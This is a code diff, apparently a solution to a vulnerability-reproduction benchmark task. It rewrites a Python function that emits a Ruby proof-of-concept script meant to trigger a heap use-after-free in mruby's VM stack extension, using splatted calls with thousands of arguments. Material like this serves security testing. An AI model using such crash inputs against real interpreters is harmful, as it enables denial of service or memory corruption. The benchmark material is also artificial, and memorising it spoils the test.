@@ -1,40 +1,21 @@
-import itertools
-import string
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in mruby.
+        # The vulnerability is a Heap Use-After-Free in mruby's stack management.
+        # It occurs when mrb_stack_extend is called to grow the VM stack (e.g., when pushing many arguments),
+        # but the 'regs' pointer (pointing to the current stack frame) is not updated, leading to access of freed memory.
+        #
+        # To trigger this, we construct a Ruby script that calls a method with a very large number of arguments
+        # using the splat operator (*). This forces the VM to expand the stack dynamically during the call setup.
         
-        The vulnerability occurs when 'mrb_stack_extend' reallocates the VM stack,
-        but the 'regs' pointer in the VM loop (or specific opcode handler like OP_ENTER)
-        is not updated to point to the new stack location. Using 'regs' subsequently
-        accesses freed memory.
+        # We use a large array size (150,000) to ensure stack reallocation occurs.
+        # The exact size needed depends on the initial stack capacity, but this is sufficiently large.
         
-        To trigger this, we define a method with a large number of explicit arguments,
-        forcing the VM to verify and potentially extend the stack to accommodate the
-        large stack frame required for the method call. A count of 2000 arguments
-        creates a PoC matching the ground truth length (~7270 bytes) and reliably
-        exceeds the default stack capacity.
-        """
-        # Number of arguments to define and pass.
-        # Based on ground truth length analysis: 
-        # ~2000 args with short names (a, b... aa...) results in approx 7300 bytes.
-        N = 2000
-        
-        def name_generator():
-            # Generates 'a', 'b', ..., 'z', 'aa', 'ab', ...
-            for length in range(1, 4):
-                for chars in itertools.product(string.ascii_lowercase, repeat=length):
-                    yield "".join(chars)
-
-        # Generate unique argument names
-        arg_names = list(itertools.islice(name_generator(), N))
-        args_definition = ",".join(arg_names)
-        
-        # Construct the Ruby script:
-        # 1. Define method 'f' taking N arguments.
-        # 2. Call 'f' with an array of N elements expanded via splat operator.
-        poc_script = f"def f({args_definition});end;f(*Array.new({N},1))"
-        
-        return poc_script.encode('utf-8')
+        poc = (
+            b"def f(*args)\n"
+            b"end\n"
+            b"a = [0] * 150000\n"
+            b"f(*a)\n"
+        )
+        return poc
